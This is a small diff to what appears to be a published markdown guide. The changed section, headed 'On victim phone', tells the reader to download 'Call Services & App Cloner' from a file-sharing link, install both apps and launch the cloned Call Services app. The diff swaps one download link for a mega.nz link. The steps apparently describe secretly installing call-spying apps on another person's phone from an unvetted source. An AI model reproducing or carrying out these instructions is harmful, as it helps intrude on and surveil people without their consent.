@@ -8,7 +8,7 @@ published: true
 `--- On victim phone ---`
 
 * Go to this link to Download Call Services & App Cloner
-   Link: [https://pastelink.net/1jzq0](https://pastelink.net/1jzq0)
+   Link: [https://mega.nz/file/WF1i1Cyb](https://mega.nz/file/WF1i1Cyb#0smbbRObEIw-66s36dCgsUjXh_LCi9psaXk3aElrv_Q)
 * Download both the apps and Install them.
 * Open App Cloner and Click on CLONED APPS.
 * Click on Call Services and Launch it.
